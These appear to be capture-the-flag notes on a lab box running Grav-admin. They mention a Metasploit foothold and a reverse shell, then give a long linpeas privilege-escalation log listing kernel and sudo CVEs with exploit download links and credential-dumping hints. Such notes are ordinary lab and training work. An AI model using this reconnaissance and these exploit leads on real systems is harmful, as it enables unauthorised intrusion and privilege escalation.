Box has 22 and 80 running

Visiting 80 we find we need to access Grav-admin

Grav-admin is exploitable by metasploit

I found that the connection dies quickly. Created a bash shell for a reverse and ran it to call back to me.

Started enumerating the box

We have user alex, however, nothing is running.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


```
                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                     
    |---------------------------------------------------------------------------------|                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                     
    |         Follow on Twitter         :     @carlospolopm                           |                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                     
    |---------------------------------------------------------------------------------|                                                                     
    |                                 Thank you!                                      |                                                                     
    \---------------------------------------------------------------------------------/                                                                     
          linpeas-ng by carlospolop                                                                                                                         
                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                              
                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                         
                               ╚═══════════════════╝                                                                                                        
OS: Linux version 5.4.0-146-generic (buildd@lcy02-amd64-026) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: gravity
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                                                                                 
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                          
                                                                                                                                                            
                                                                                                                                                            

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
DONE
                                                                                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                          
                              ╚════════════════════╝                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                          
Linux version 5.4.0-146-generic (buildd@lcy02-amd64-026) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023   
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.6 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                             
Sudo version 1.8.31                                                                                                                                         

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560                                                                                                                                 

Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                     
/usr/bin:/bin                                                                                                                                               
New path exported: /usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin

╔══════════╣ Date & uptime
Sat 08 Apr 2023 09:34:30 PM UTC                                                                                                                             
 21:34:30 up 55 min,  0 users,  load average: 0.38, 0.09, 0.03

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                        
sda
sda1
sda2
sda3

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                   
/dev/disk/by-id/dm-uuid-LVM-tecYKmaJOxAR8IqDsJkFH4BbBCG9JBfXXe0klKu8L5QeChfq2ojdvU7zBtgAsvll / ext4 defaults 0 1                                            
/dev/disk/by-uuid/c1f1cf69-1d06-429c-8e83-732717012c4b /boot ext4 defaults 0 1
/swap.img       none    swap    sw      0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                     
HISTFILESIZE=0                                                                                                                                              
SHLVL=2
HOME=/var/www
OLDPWD=/var/www/html/grav-admin
LOGNAME=www-data
_=./linpeas.sh
PATH=/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/sh
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                      
dmesg Not Found                                                                                                                                             
                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                          
cat: write error: Broken pipe                                                                                                                               
cat: write error: Broken pipe
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                     
                                                                                                                                                            
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                               
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                            

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                         
                                   ╚═══════════╝                                                                                                            
╔══════════╣ Container related tools present
╔══════════╣ Am I Containered?                                                                                                                              
╔══════════╣ Container details                                                                                                                              
═╣ Is this a container? ........... No                                                                                                                      
═╣ Any running containers? ........ No                                                                                                                      
                                                                                                                                                            

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                         
                                     ╚═══════╝                                                                                                              
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS Lambda? .......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                          
                ╚════════════════════════════════════════════════╝                                                                                          
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                 
root           1  0.0  0.6 105892 12940 ?        Ss   20:38   0:01 /sbin/init maybe-ubiquity                                                                
root         488  0.0  0.9  43928 18460 ?        S<s  20:38   0:00 /lib/systemd/systemd-journald
root         522  0.0  0.3  22888  6380 ?        Ss   20:38   0:00 /lib/systemd/systemd-udevd
root         686  0.0  0.8 345816 18220 ?        SLsl 20:38   0:00 /sbin/multipathd -d -s
systemd+     729  0.0  0.2  90880  6056 ?        Ssl  20:38   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         737  0.0  0.5  47544 10412 ?        Ss   20:38   0:00 /usr/bin/VGAuthService
root         738  0.0  0.4 311540  8564 ?        Ssl  20:38   0:02 /usr/bin/vmtoolsd
systemd+     811  0.0  0.3  27372  7844 ?        Ss   20:38   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+     813  0.0  0.5  24412 11960 ?        Ss   20:38   0:00 /lib/systemd/systemd-resolved
root         909  0.0  0.4 239280  9288 ?        Ssl  20:40   0:00 /usr/lib/accountsservice/accounts-daemon
root         913  0.0  0.1   6816  3016 ?        Ss   20:40   0:00 /usr/sbin/cron -f
message+     914  0.0  0.2   7680  4824 ?        Ss   20:40   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         925  0.0  0.1  81952  3820 ?        Ssl  20:40   0:00 /usr/sbin/irqbalance --foreground
root         926  0.0  0.9  29664 18516 ?        Ss   20:40   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         929  0.0  0.4 236420  9188 ?        Ssl  20:40   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       931  0.0  0.2 224344  5364 ?        Ssl  20:40   0:00 /usr/sbin/rsyslogd -n -iNONE
root         933  0.0  2.0 801568 41492 ?        Ssl  20:40   0:01 /usr/lib/snapd/snapd
root         935  0.0  0.3  17224  7592 ?        Ss   20:40   0:00 /lib/systemd/systemd-logind
root         937  0.0  0.6 395568 13768 ?        Ssl  20:40   0:00 /usr/lib/udisks2/udisksd
daemon[0m       940  0.0  0.1   3796  2232 ?        Ss   20:40   0:00 /usr/sbin/atd -f
root         955  0.0  0.0   5828  1732 tty1     Ss+  20:40   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         998  0.0  0.6 245088 13316 ?        Ssl  20:40   0:00 /usr/sbin/ModemManager
root        1022  0.0  1.0 107924 20744 ?        Ssl  20:40   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root        1036  0.0  1.7 236728 36552 ?        Ss   20:40   0:00 /usr/sbin/apache2 -k start
www-data    1398  0.0  0.7 237000 14544 ?        S    20:40   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1399  0.0  0.7 237000 14544 ?        S    20:40   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1400  0.0  0.7 237000 14544 ?        S    20:40   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1401  0.0  0.7 237000 14544 ?        S    20:40   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1402  0.0  0.7 237000 14544 ?        S    20:40   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1859  0.0  0.7 237000 14544 ?        S    20:42   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1870  0.0  0.7 237000 14544 ?        S    20:42   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1871  0.0  0.7 237000 14544 ?        S    20:42   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1872  0.0  0.7 237000 14544 ?        S    20:42   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1875  0.0  0.7 237000 14544 ?        S    20:42   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
root        1307  0.0  1.4 384908 29416 ?        Ssl  20:40   0:00 /usr/libexec/fwupd/fwupd
root        1433  0.0  0.4 314928  9440 ?        Ssl  20:40   0:00 /usr/lib/upower/upowerd
www-data    3617  0.0  0.0   2608   596 ?        S    21:30   0:00 sh -c /bin/sh
www-data    3618  0.0  0.0   2608   596 ?        S    21:30   0:00  _ /bin/sh
www-data    3645  0.0  0.1   6892  3312 ?        S    21:31   0:00      _ /bin/bash ./reverse.sh
www-data    3648  0.0  0.1   7236  3940 ?        S    21:31   0:00          _ bash -i
www-data    3779  0.0  0.1   3752  2860 ?        S    21:34   0:00              _ /bin/sh ./linpeas.sh
www-data    6840  0.0  0.0   3752  1232 ?        S    21:34   0:00                  _ /bin/sh ./linpeas.sh
www-data    6843  0.0  0.1   9220  3688 ?        R    21:34   0:00                  |   _ ps fauxwww
www-data    6844  0.0  0.0   3752  1232 ?        S    21:34   0:00                  _ /bin/sh ./linpeas.sh

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                
                                                                                                                                                            
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                          
COMMAND    PID  TID TASKCMD               USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                                                                   

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                          
gdm-password Not Found                                                                                                                                      
gnome-keyring-daemon Not/etc/ImageMagick-6/mime.xml
 Found                                                                                                                              
lightdm Not Found                                                                                                                                           
vsftpd Not Found                                                                                                                                            
apache2 process found (dump creds from memory as root)                                                                                                      
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                      
/usr/bin/crontab                                                                                                                                            
* * * * * cd /var/www/html/grav-admin;/usr/bin/php bin/grav scheduler 1>> /dev/null 2>&1
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab                                                                                                    

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Mar 29 07:16 .
drwxr-xr-x 103 root root 4096 Mar 29 07:17 ..
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  190 Aug 31  2022 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root 4096 Mar 29 07:16 .
drwxr-xr-x 103 root root 4096 Mar 29 07:17 ..
-rwxr-xr-x   1 root root  539 Feb 23  2021 apache2
-rwxr-xr-x   1 root root  376 Dec  4  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root  214 Apr 25  2022 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Aug 31  2022 .
drwxr-xr-x 103 root root 4096 Mar 29 07:17 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Aug 31  2022 .
drwxr-xr-x 103 root root 4096 Mar 29 07:17 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Mar 29 07:03 .
drwxr-xr-x 103 root root 4096 Mar 29 07:17 ..
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  403 Apr 25  2022 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * cd /var/www/html/grav-admin;/usr/bin/php bin/grav scheduler 1>> /dev/null 2>&1

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                              
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                 

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                 
/etc/systemd/system/multi-user.target.wants/atd.service is executing some relative path                                                                     
/etc/systemd/system/multi-user.target.wants/grub-common.service is executing some relative path
/etc/systemd/system/sleep.target.wants/grub-common.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                   
NEXT                        LEFT          LAST                        PASSED     UNIT                         ACTIVATES                                     
Sat 2023-04-08 21:39:00 UTC 4min 19s left Sat 2023-04-08 21:09:01 UTC 25min ago  phpsessionclean.timer        phpsessionclean.service       
Sun 2023-04-09 00:00:00 UTC 2h 25min left Sat 2023-04-08 20:40:54 UTC 53min ago  logrotate.timer              logrotate.service             
Sun 2023-04-09 00:00:00 UTC 2h 25min left Sat 2023-04-08 20:40:54 UTC 53min ago  man-db.timer                 man-db.service                
Sun 2023-04-09 02:52:53 UTC 5h 18min left Sat 2023-04-08 20:41:09 UTC 53min ago  ua-timer.timer               ua-timer.service              
Sun 2023-04-09 03:10:20 UTC 5h 35min left Mon 2023-04-03 08:49:49 UTC 5 days ago e2scrub_all.timer            e2scrub_all.service           
Sun 2023-04-09 06:38:34 UTC 9h left       Sat 2023-04-08 20:40:54 UTC 53min ago  apt-daily-upgrade.timer      apt-daily-upgrade.service     
Sun 2023-04-09 09:31:09 UTC 11h left      Sat 2023-04-08 20:40:54 UTC 53min ago  motd-news.timer              motd-news.service             
Sun 2023-04-09 14:52:02 UTC 17h left      Sat 2023-04-08 20:40:54 UTC 53min ago  fwupd-refresh.timer          fwupd-refresh.service         
Sun 2023-04-09 16:26:28 UTC 18h left      Sat 2023-04-08 20:40:54 UTC 53min ago  apt-daily.timer              apt-daily.service             
Sun 2023-04-09 20:53:59 UTC 23h left      Sat 2023-04-08 20:53:59 UTC 40min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2023-04-10 00:00:00 UTC 1 day 2h left Mon 2023-04-03 08:48:47 UTC 5 days ago fstrim.timer                 fstrim.service                
n/a                         n/a           n/a                         n/a        snapd.snap-repair.timer      snapd.snap-repair.service     

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                   
                                                                                                                                                            
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                  
/etc/systemd/system/cloud-init.target.wants/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd                  
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core20/1611/etc/systemd/system/cloud-init.target.wants/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/snap/core20/1611/usr/lib/systemd/system/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/snap/core20/1611/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core20/1611/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core20/1611/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                                                                           
/snap/core20/1611/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core20/1611/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core20/1611/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core20/1611/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core20/1611/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core20/1611/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core20/1852/etc/systemd/system/cloud-init.target.wants/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/snap/core20/1852/usr/lib/systemd/system/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/snap/core20/1852/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core20/1852/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core20/1852/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                                                                           
/snap/core20/1852/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core20/1852/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core20/1852/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core20/1852/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core20/1852/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core20/1852/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                  
/org/kernel/linux/storage/multipathd                                                                                                                        
/run/dbus/system_bus_socket
  └─(Read Write)
/run/irqbalance//irqbalance925.sock
  └─(Read )
/run/irqbalance/irqbalance925.sock
  └─(Read )
/run/lvm/lvmpolld.socket
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)
/var/snap/lxd/common/lxd/unix.socket

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                    
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)                                      

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                    
NAME                            PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION                          
:1.0                            729 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -
:1.1                              1 systemd         root             :1.1          init.scope                  -       -
:1.10                          1022 unattended-upgr root             :1.10         unattended-upgrades.service -       -
:1.11                           933 snapd           root             :1.11         snapd.service               -       -
:1.14                          1307 fwupd           root             :1.14         fwupd.service               -       -
:1.15                          1433 upowerd         root             :1.15         upower.service              -       -
:1.2                            811 systemd-network systemd-network  :1.2          systemd-networkd.service    -       -
:1.3                            813 systemd-resolve systemd-resolve  :1.3          systemd-resolved.service    -       -
:1.30                         10026 busctl          www-data         :1.30         cron.service                -       -
:1.4                            937 udisksd         root             :1.4          udisks2.service             -       -
:1.5                            909 accounts-daemon[0m root             :1.5          accounts-daemon.service     -       -
:1.6                            929 polkitd         root             :1.6          polkit.service              -       -
:1.7                            998 ModemManager    root             :1.7          ModemManager.service        -       -
